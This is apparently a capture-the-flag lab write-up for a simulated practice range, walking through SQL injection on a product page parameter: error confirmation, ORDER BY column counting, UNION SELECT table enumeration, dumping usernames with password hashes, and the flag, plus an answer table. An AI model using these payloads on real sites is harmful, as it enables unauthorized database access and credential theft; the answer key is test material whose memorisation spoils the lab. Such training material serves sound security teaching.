# Lab 02 — SQL Injection: From Error to Data

**Category:** Web / Database
**Target:** `http://10.10.10.5/product.php?id=1`
**Environment:** TechBiz Security Academy — simulated practice range

## Objectives
- Trigger a database error to confirm injection
- Determine the number of columns
- Get output back with a `UNION SELECT`
- Enumerate table names
- Dump credentials from the `users` table

## Methodology

### 1. Confirm the injection
```
sqli 1'
```
```
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual
that corresponds to your MySQL 5.7.33 server version...
```
The unescaped single quote broke the query — the `id` parameter is directly concatenated into SQL. The error message also disclosed the database engine and version.

### 2. Determine column count
```
sqli 1' ORDER BY 1-- -
sqli 1' ORDER BY 2-- -
sqli 1' ORDER BY 3-- -
sqli 1' ORDER BY 4-- -
```
`ORDER BY 1/2/3` returned normally; `ORDER BY 4` errored with `Unknown column '4'`. The query returns **3 columns**.

### 3. Confirm UNION SELECT reflection
```
sqli 1' UNION SELECT 1,2,3-- -
```
```
| 1 | 2 | 3 |
```
All three columns reflect into the page output, giving three positions to pivot arbitrary data through.

### 4. Enumerate table names
```
sqli 1' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
```
```
| 1 | users     | 3 |
| 1 | products  | 3 |
| 1 | notes     | 3 |
```

### 5. Dump the credentials table
```
sqli 1' UNION SELECT 1,username,password FROM users-- -
```
```
| 1 | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 1 | jsmith  | e10adc3949ba59abbe56e057f20f883e |
| 1 | finance | 25d55ad283aa400af464c76d713c07ad |
```

### 6. Extract the flag
```
sqli 1' UNION SELECT 1,note,3 FROM notes-- -
```
```
| 1 | 1 | TBS{union_select_dumps_the_db} |
```

## Answers
| Q | Question | Answer |
|---|---|---|
| q1 | Database engine | `MySQL` |
| q2 | Columns returned | `3` |
| q3 | Table storing credentials | `users` |
| q4 | Admin password hash | `5f4dcc3b5aa765d61d8327deb882cf99` |
| q5 | Flag | `TBS{union_select_dumps_the_db}` |

## Takeaways
- A single unescaped quote is enough to prove classic error-based injection.
- `ORDER BY` is the standard, low-noise way to fingerprint column count before attempting a `UNION SELECT`.
- Once column count and reflection are confirmed, `information_schema` gives full schema visibility — table names, column names, and ultimately the data itself — all without any authentication.
- Parameterized queries / prepared statements are the fix; string concatenation of user input into SQL is the root cause every time.
